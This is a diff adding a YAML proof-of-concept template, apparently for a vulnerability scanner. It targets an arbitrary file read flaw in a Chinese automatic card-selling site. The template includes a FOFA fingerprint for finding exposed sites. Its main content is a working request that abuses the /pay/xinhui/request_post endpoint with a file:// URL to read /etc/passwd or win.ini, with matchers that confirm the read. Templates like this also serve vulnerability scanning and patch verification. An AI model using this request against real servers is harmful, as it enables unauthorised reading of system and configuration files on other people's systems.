@@ -1,0 +1,33 @@
+id: poc-yaml-jingsoft-request-post-anyfile-read
+info:
+  name: 鲸软 全自动发卡网 request_post 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 全自动发卡网
+  fofa: body="/static/theme/maowang51/css/style.css"
+variables:
+  path: 'etc/passwd
+
+    c:/windows/win.ini
+
+    '
+requests:
+- method: GET
+  path: /pay/xinhui/request_post?url=file:///{{.path}}&post_data[1]=aaa
+  expression: '(status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"; for 16-bit app support") && contains(body,"[files]"))
+
+    )
+
+    '
+transport: http
